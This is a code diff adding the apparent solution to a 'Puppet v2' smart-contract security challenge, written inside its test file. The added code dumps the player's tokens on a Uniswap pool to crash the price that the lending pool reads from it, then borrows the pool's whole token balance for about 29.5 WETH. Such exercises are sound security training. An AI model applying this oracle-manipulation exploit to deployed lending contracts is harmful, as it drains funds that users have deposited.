@@ -83,6 +83,46 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let amountIn;
+        amountIn = PLAYER_INITIAL_TOKEN_BALANCE;
+        await token.connect(player).approve(uniswapRouter.address, amountIn);
+        let time = await ethers.provider.getBlock('latest');
+        await uniswapRouter
+        .connect(player)
+        .swapExactTokensForETH(
+            amountIn,
+            1,
+            [token.address, weth.address],
+            player.address,
+            time.timestamp + 5000
+        );
+        let bal, reserveA, reserveB;
+        reserveA = await token.balanceOf(uniswapExchange.address);
+        console.log(
+        "Exchange Token balance",
+        ethers.utils.formatEther(reserveA.toString())
+        );
+        reserveB = await weth.balanceOf(uniswapExchange.address);
+        console.log(
+        "Exchange Eth balance",
+        ethers.utils.formatEther(reserveB.toString())
+        );
+        bal = await ethers.provider.getBalance(player.address);
+        console.log("Player Eth balance", ethers.utils.formatEther(bal.toString()));
+        amountIn = await lendingPool.calculateDepositOfWETHRequired(
+        POOL_INITIAL_TOKEN_BALANCE
+        );
+        console.log(
+        "Amount required to drain the pool",
+        ethers.utils.formatEther(amountIn.toString())
+        );
+        await weth
+        .connect(player)
+        .deposit({ value: ethers.utils.parseEther("29.5") });
+        await weth
+        .connect(player)
+        .approve(lendingPool.address, ethers.utils.parseEther("29.5"));
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
